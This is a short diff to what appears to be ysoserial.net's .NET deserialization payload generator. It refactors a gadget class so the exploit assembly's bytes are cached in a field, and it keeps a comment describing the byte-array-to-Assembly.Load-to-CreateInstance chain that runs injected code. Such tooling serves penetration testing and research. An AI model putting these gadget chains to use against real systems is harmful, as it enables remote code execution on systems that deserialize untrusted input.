@@ -31,8 +31,10 @@ namespace ysoserial.Generators
     [Serializable]
     public class PayloadClass : ISerializable
     {
+        protected byte[] assemblyBytes;
         public PayloadClass()
         {
+            this.assemblyBytes = File.ReadAllBytes(typeof(ExploitClass).Assembly.Location);
         }
 
         protected PayloadClass(SerializationInfo info, StreamingContext context)
@@ -46,7 +48,7 @@ namespace ysoserial.Generators
             // Build a chain to map a byte array to creating an instance of a class.
             // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
             List<byte[]> data = new List<byte[]>();
-            data.Add(File.ReadAllBytes(typeof(ExploitClass).Assembly.Location));
+            data.Add(this.assemblyBytes);
             var e1 = data.Select(Assembly.Load);
             Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
             var e2 = e1.SelectMany(map_type);
